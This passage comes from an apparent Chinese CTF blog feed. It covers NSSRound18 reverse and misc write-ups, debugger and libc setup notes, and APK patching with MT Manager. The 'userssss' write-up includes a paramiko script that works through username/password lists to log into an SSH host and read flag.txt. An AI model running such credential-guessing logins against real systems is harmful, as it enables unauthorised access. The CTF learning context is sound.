src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707902261420-02f82295-67c4-477e-8674-c6ad06b5b9f1.png" class="" title="img"><p>145,118,31,48,103,110,52,82,113,19,83,44,176,130,138,129,115,110,38,10,42,100,193,105,125,61,7,229,230,180,68,133,11,177,210,122,161,60,129,140,16,45,224,83,238,0,213,157,121,193,135,197,87,118,155,110,90,91,30,158,248,44,95,215,166,247,239,43,228,114,227,146,164,137,111,79,143,17,132,14</p><p>key和填充方式很明显，但是解不出来？</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707905579072-8d1e25a1-ec40-4bb9-9c35-60d95850cc67.png" class="" title="img"><p>md，key和iv弄反了，而且key是utf-8形式，不找借口</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008328700-57e3f9c3-60ba-4b81-b999-6e1791f9855f.png" class="" title="img"><p>用另一种方式复现</p><p>要经过check函数才会执行gift</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008674108-1e115c0f-0266-4197-9f3b-d3bbd9ae9567.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008835792-7cb82437-2578-47d6-a225-1df4bbec6959.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008882947-d72a0c6a-4e9f-4efb-9dc0-83df6e4af26b.png" class="" title="img"><p>修改初始值的话选择编辑类</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008910188-821abe3f-4db0-440d-9c19-04fc8c88a72a.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009108153-0bd6ce8f-8d07-4512-bf4c-d518cbb331f3.png" class="" title="img"><p>如果直接保存模块也能出，还是有一定概率</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009225510-6cfe7d63-9df6-4784-a4ef-2e73f8f09c5f.png" class="" title="img"><p>要的flag在这里，修改一下使得它必然被执行</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009396841-b920b4d0-fa87-45f9-9058-ee4b5bf7bc4d.png" class="" title="img"><p>右键编辑方法</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009508484-d19253c5-2bba-428e-b6ea-107e6f5171ee.png" class="" title="img"><h2 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h2><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708053405853-dab66655-2aa2-48ae-86cf-56d3488772a7.png" class="" title="img"><p>string有dll</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708053940754-b3a3b96a-3c0b-458e-a3c4-d72451611a5c.png" class="" title="img"><p>也没看到有sha256算法</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708054072607-ad2c4d64-f471-4eb1-b285-19581f54694d.png" class="" title="img"><p>010搜索MZ</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708054194721-3290df63-dc66-4aa8-941d-49c46082fa3e.png" class="" title="img"><p>用Dnspy打开</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708063124709-72492c56-0475-4245-8080-1c845e3e67ad.png" class="" title="img"><p>用vscode运行即可</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708065409901-24731386-9db8-4c83-a1b8-df148d58cc6e.png" class="" title="img"><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="酒吧"><a href="#酒吧" class="headerlink" title="酒吧"></a>酒吧</h2><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897006283-e11c8e66-60d8-453b-bbb4-4923172ebad4.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897289557-b1b0d72c-33b7-452d-b9d9-3c335f494b72.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897442652-5643f483-589a-42c4-a7ee-ac578ca09b93.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897125919-70ff2871-f8fc-49d1-af17-80f663910385.png" class="" title="img"><h2 id="number7"><a href="#number7" class="headerlink" title="number7"></a>number7</h2><p>直接解base64会出错，修改第七个和第九个数字从0到f都不对</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707898430820-55d77299-2129-495c-8f4b-9674a7e705b3.png" class="" title="img"><p>根据Number7 而且inside NO.7猜测cisco type7加密</p><p>后面少了几位，但是不影响flag<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708007743062-01c8b0da-a225-42ab-8bf6-0c5ee8524710.png" class="" title="img"></p><h2 id="userssss"><a href="#userssss" class="headerlink" title="userssss"></a>userssss</h2><p>想法是写脚本算md5sum，然后自动交互</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707899075674-94d6549e-74b1-4fa9-9a6d-11d6ac0001c0.png" class="" title="img"><p>不知道要向远程怎么发送，要有用户名和密码</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707899762242-e173afcc-df88-420a-a26c-f2ae5bb6c5c8.png" class="" title="img"><p>首先md5sum就是MD5，其次用ssh -p连接</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009841111-baa8ea56-12cd-4ef5-bb68-60ab768691fb.png" class="" title="img"><p>自动算md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">input</span>=<span class="hljs-string">&quot;/CVE/wordlist.txt&quot;</span><br>output=<span class="hljs-string">&quot;/CVE/4.txt&quot;</span><br><br><span class="hljs-comment"># 重置输出文件</span><br>&gt; <span class="hljs-string">&quot;$output&quot;</span><br><br><span class="hljs-comment"># 遍历wordlist.txt中的每一行</span><br><span class="hljs-keyword">while</span> IFS= read -r line || [[ -n <span class="hljs-string">&quot;$line&quot;</span> ]]; do<br>    <span class="hljs-comment"># 跳过空白行</span><br>    <span class="hljs-keyword">if</span> [[ -z <span class="hljs-string">&quot;$line&quot;</span> ]]; then<br>        <span class="hljs-keyword">continue</span><br>    fi<br><br>    <span class="hljs-comment"># 计算每行的MD5哈希值</span><br>    md5=$(echo -n <span class="hljs-string">&quot;$line&quot;</span> | md5sum | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 将计算出的哈希值追加到4.txt文件中</span><br>    echo <span class="hljs-string">&quot;$md5&quot;</span> &gt;&gt; <span class="hljs-string">&quot;$output&quot;</span><br>done &lt; <span class="hljs-string">&quot;$input&quot;</span><br></code></pre></td></tr></table></figure><p>自动交互</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> paramiko<br><br><span class="hljs-comment"># 设置主机信息</span><br>hostname = <span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span><br>port = <span class="hljs-number">28591</span><br><br><span class="hljs-comment"># 读取用户名和密码列表</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;wordlist.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> user_file:<br>    usernames = user_file.read().splitlines()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;10.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> pass_file:<br>    passwords = pass_file.read().splitlines()<br><br><span class="hljs-comment"># 确保用户名和密码列表长度相同</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(usernames) == <span class="hljs-built_in">len</span>(passwords), <span class="hljs-string">&quot;用户名和密码数量不匹配&quot;</span><br><br><span class="hljs-comment"># 尝试登录并执行命令</span><br><span class="hljs-keyword">for</span> username, password <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(usernames, passwords):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 初始化SSH客户端</span><br>        client = paramiko.SSHClient()<br>        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>        <br>        <span class="hljs-comment"># 尝试连接</span><br>        client.connect(hostname, port, username, password, timeout=<span class="hljs-number">10</span>)<br>        <br>        <span class="hljs-comment"># 执行ls命令</span><br>        stdin, stdout, stderr = client.exec_command(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>        output = stdout.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <br>        <span class="hljs-comment"># 检查是否存在flag.txt</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag.txt&#x27;</span> <span class="hljs-keyword">in</span> output:<br>            <span class="hljs-comment"># 读取flag.txt内容</span><br>            stdin, stdout, stderr = client.exec_command(<span class="hljs-string">&#x27;cat flag.txt&#x27;</span>)<br>            flag_content = stdout.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).strip()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到flag: <span class="hljs-subst">&#123;flag_content&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;在用户 <span class="hljs-subst">&#123;username&#125;</span> 的目录中没有找到flag.txt&quot;</span>)<br>        <br>    <span class="hljs-keyword">except</span> paramiko.AuthenticationException:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;登录失败：用户名 <span class="hljs-subst">&#123;username&#125;</span> 或密码错误&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;发生错误：<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        client.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unity逆向</tag>
      
      <tag>VM</tag>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn调试插件的安装与使用</title>
    <link href="/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>written in 2023.7.5</p><p>链接如下：</p><p><a href="https://blog.csdn.net/aoxixi/article/details/90142736">https://blog.csdn.net/aoxixi/article/details/90142736</a></p><p>对应启动命令：</p><p>echo “source ~&#x2F;GdbPlugins&#x2F;peda&#x2F;peda.py” &gt; ~&#x2F;.gdbinit </p><p>echo “source ~&#x2F;GdbPlugins&#x2F;gef&#x2F;gef.py” &gt; ~&#x2F;.gdbinit </p><p>echo “source ~&#x2F;GdbPlugins&#x2F;gdbinit&#x2F;gdbinit” &gt; ~&#x2F;.gdbinit </p><p>echo “source ~&#x2F;GdbPlugins&#x2F;pwndbg&#x2F;gdbinit.py” &gt; ~&#x2F;.gdbinit</p><p>written in 2024.3.27</p><p>今天在用pwndbg调试的时候发现用不了fmtarg</p><img src="/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545503373-5e3c9f65-a0d7-4b95-88cc-61ad03f8b8aa.png" class="" title="img"><p>在师傅的提醒下发现没装pwngdb</p><p>安装教程很好找</p><p><a href="https://hgg-bat.github.io/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#%E5%AE%89%E8%A3%85pwndbg-pwngdb-%E8%81%94%E5%90%88%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83">https://hgg-bat.github.io/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#%E5%AE%89%E8%A3%85pwndbg-pwngdb-%E8%81%94%E5%90%88%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83</a></p><p>然而这个时候变成了peda插件<img src="/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545652379-1c7edc3f-c6d7-4890-a057-9b927d6b189d.png" class="" title="img"></p><p>显然我不爽</p><img src="/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545638070-e9e6bdb4-90b0-41df-9d76-02738751b58f.png" class="" title="img"><p>于是把peda这行注释掉，再写对pwndbg中gdbinit.py的路径后（原来没有GdbPlugins，这是我自己的路径），发现达到目的了，也就是第四行代码没用</p><img src="/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545436991-0789d3dc-7355-41e5-adb2-33562cc14b2e.png" class="" title="img"><p>还是很感谢成长过程中的各位师傅(❁´◡&#96;❁)</p><img src="/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545974939-334d1a9c-10ae-4b8f-8d57-3d61363f671a.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>如何安装libcsearch</title>
    <link href="/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/"/>
    <url>/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/</url>
    
    <content type="html"><![CDATA[<p>github上libcsearch只对python2有效，用python3就找不到匹配的libc版本了，网上说的重装或者更新都是针对python2的，由于本机安装pwntools用的是python3且python2已经不维护了，干脆就另寻出路</p><p><a href="https://pypi.org/project/LibcSearcher/#files">https://pypi.org/project/LibcSearcher/#files</a></p><p>从上面的链接中下载libcsearch可满足python3</p><p>然后再去跑脚本，果然可以了</p><img src="/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/1691905062554-b22ce7a6-1d9a-4bf7-972b-b4a57d8cab49.png" class="" title="img"><p>这是远程的libc选择，和本地不一样</p><p>上网查一下发现ubuntu18对应libc2.27，先试一下第三个，成功</p><img src="/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/1691905008510-c2cd1f79-d48d-422d-9ae0-659f0d94e1e0.png" class="" title="img"><p>还有个问题是要知道本机的libc版本，我这里是libc6_2.36-4_amd64,这样打本地会快一点，每次打个一两分钟都是常有的事，不用奇怪</p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>二进制文件存在但仍有FileNotFoundError</title>
    <link href="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/"/>
    <url>/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/</url>
    
    <content type="html"><![CDATA[<p>桌面明明有vuln这个文件，但是kali仍有FileNotFoundError</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/4BE59ACDFB71F188E62CCF1B8E4A7979.jpg" class="" title="img"><p>问群里的师傅原来是要装glibc-all-in-one</p><p>一开始师傅说要用.&#x2F;libc.so.6查看要安装的libc版本，但本地一直报错</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/7DFD5873CC9E06A971F4766218EB5E2C.jpg" class="" title="img"><p>我google了但是一直没有直接的解决方案，于是在另一位师傅的推荐下看了另一篇文档，用strings libc.so.6 |grep Ubuntu来确定需要安装的libc库 </p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215652930.png" class="" title="image-20240201215652930"><p>直接下载libc出错，于是去官网手动下载</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215612566.png" class="" title="image-20240201215612566"><p>最后按教程配置即可</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215510938.png" class="" title="image-20240201215510938"><p>参考链接：<a href="https://www.freebuf.com/sectool/366854.html">https://www.freebuf.com/sectool/366854.html</a></p><p><a href="https://blog.csdn.net/weixin_49764009/article/details/124970461">【kali】 glibc-all-in-one安装 （解决version <code>GLIBC_2.34‘ not found）_version </code>glibc_2.34’ not found-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>以一道pwn题学习如何动调</title>
    <link href="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/"/>
    <url>/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/</url>
    
    <content type="html"><![CDATA[<p>这是0xGame的week2的一道pwn题，题目本身不难，有一个疑问，刚好借此巩固了一下pwn的动调，希望可以有所收获</p><p><strong>目标：去看dword_40e0改变后的值</strong></p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696928256892-d5876add-9c6c-48f5-a51b-ec3c4a6ace91.png" class="" title="img"><p>一开始是2，memset赋值为0</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933587412-3d11e82a-c48c-48a4-91c9-c5d8ffea408e.png" class="" title="img"><p><strong>查看内存注意不要加*</strong></p><p>因为是小端序，红色框起来的部分是shopping_cart[0]</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696931566289-5ff15310-4891-45fc-a21c-36b568debc5f.png" class="" title="img"><p>看基址</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696928301743-312c76ab-6eda-4690-beb0-643c5b194883.png" class="" title="img"><p><strong>加偏移后得到真实地址</strong></p><p>在两次scanf之间下断点</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933156497-0828eea7-53fe-441e-8643-1c57ec02a3aa.png" class="" title="img"><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933120221-449859d4-9339-433c-8c6c-2095728035b8.png" class="" title="img"><p>有断点所以会停下来</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933208375-7fd26797-e85b-434c-82a5-444f7d6dc676.png" class="" title="img"><p>单步步过至0x5555555555452(超过544f）</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933320205-b8f8d425-ff15-4ad5-96c4-fb5f81598879.png" class="" title="img"><p>再看内存就发现变了</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933006068-cde05956-be30-4e84-bbb3-8faaab80f643.png" class="" title="img"><p>用w查看内存就可以避免端序问题</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933427059-5ce862e5-b191-4be7-9378-2d1622ea0353.png" class="" title="img">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>搭建博客时个人遇到的一些问题</title>
    <link href="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
    <url>/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>本文主要是记录一些与时俱进的问题（因为网上的教程大都是三四年前的了）和个人的一些非预期做法</p><h1 id="本地博客映射到github"><a href="#本地博客映射到github" class="headerlink" title="本地博客映射到github"></a>本地博客映射到github</h1><p>执行<code>hexo clean&amp;hexo g -d</code>后会有像下面一样时不时地报错，网上的不是很行，我这里把github名改成和博客名一样就行了</p><img src="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/1.png" class="" title="image-20240114211559597"><p>目前我的github是这么个页面</p><img src="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/image-20240114212817973.png" class="" title="image-20240114212817973"><h1 id="统计访问量"><a href="#统计访问量" class="headerlink" title="统计访问量"></a>统计访问量</h1><p>按教程用leancloud统计访问量不知道为什么本地能看到但是远程一直看不到，试了busuanzi发现也差不多</p><img src="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/image-20240114212107890.png" class="" title="image-20240114212107890"><h1 id="添加图片"><a href="#添加图片" class="headerlink" title="添加图片"></a>添加图片</h1><p><a href="https://zhuanlan.zhihu.com/p/280758822#:~:text=hexo%E5%8D%9A%E5%AE%A2%E6%98%BE%E7%A4%BAmarkdown%E8%B7%AF%E5%BE%84%E7%9A%84%E5%9B%BE%E7%89%87%201%20%E4%BF%AE%E6%94%B9%20_config.yml%20%E4%B8%AD%E7%9A%84%20post_asset_folder%3A%20true%202,install%20hexo-image-link%20--save%204%20%E4%BF%AE%E6%94%B9md%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%20%21%20%5Blabel%5D%20%28markdown-file-name%2Fimage-name.jpg%29">hexo博客显示markdown路径的图片 - 知乎 (zhihu.com)</a></p><p>我没有用教程给的方法，而是自己找了一个，把图片直接复制到文档里，markdown和博客都能直接看到图片，简洁明了</p><p>总结来说，最后能成功还是满意的，还是要自己多实践，培养独立解决问题的能力</p><p>总的参考教程附上：<a href="https://blog.csdn.net/yaorongke/article/details/119089190">https://blog.csdn.net/yaorongke/article/details/119089190</a></p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>简单使用MT管理器</title>
    <link href="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/"/>
    <url>/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>written in 2023&#x2F;10&#x2F;26</p><p>昨天看到0xGame的0x14537a60师傅提到了MT管理器，就去研究了一下</p><p>这是0xGame week3的第三题</p><p>首先把apk文件放到tmp文件夹，因为在原文件没有修改权限</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/1.jpg" class=""><p>随便找一个tmp文件夹放就行</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/2.jpg" class=""><p>去电脑上找到onClick绝对路径</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/3.png" class=""><p>用dex编辑器打开classes.dex,若有多个一般都是最后一个dex</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/4.jpg" class=""><p>找到方法</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/5.jpg" class=""><p>进去看方法，原来是v4，改成v1</p><p>这里为什么这样改呢，我的想法是第十行result-object，还有就是第九行v1,v2和v3在一起出现</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/6.jpg" class=""><p>再重新安装后运行</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/7.jpg" class=""><p>浅浅学了一下，希望对以后有点帮助</p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/01/13/hello-world/"/>
    <url>/2024/01/13/hello-world/</url>
    
